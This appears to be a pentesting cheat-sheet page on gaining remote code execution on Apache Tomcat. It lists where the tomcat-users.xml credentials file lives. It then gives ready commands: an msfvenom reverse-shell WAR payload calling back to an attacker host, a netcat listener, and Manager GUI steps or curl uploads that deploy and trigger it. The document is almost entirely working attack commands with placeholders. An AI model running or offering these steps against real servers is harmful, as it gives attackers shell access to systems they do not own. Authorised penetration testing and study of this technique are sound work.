---
title: "Apache Tomcat"
date: 2024-7-2
tags: ["tomcat", "apache", "web server", "war", "java", "rce"]
---

### Config Location

<div>

```console
/usr/share/tomcat9/etc/tomcat-users.xml
```

```console
/etc/tomcat9/tomcat-users.xml
```

</div>

<br>

---

### RCE (Authenicated)

#### 1. Create a WAR file

<div>

```console
msfvenom -p java/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war -o revshell.war
```

</div>

#### 2. Start a listener

<div>

```console
rlwrap nc -lvnp <LOCAL_PORT>
```

</div>

{{< tab set1 tab1 active >}}3a. Manager GUI{{< /tab >}}
{{< tab set1 tab2 >}}3b. Manager Script{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
+--------------------------------------------+
| Exploit                                    |
+--------------------------------------------+
| 1. Login to Tomcat Web Application Manager |
| 2. WAR file to deploy -> Deploy            |
| 3. Click /revshell in Applications table   |
+--------------------------------------------+
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
curl -u '<USERNAME>:<PASSWORD>' http://<DOMAIN>:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
```

```console
curl -s http://<DOMAIN>:8080/revshell
```

</div>

{{< /tabcontent >}}

<br>
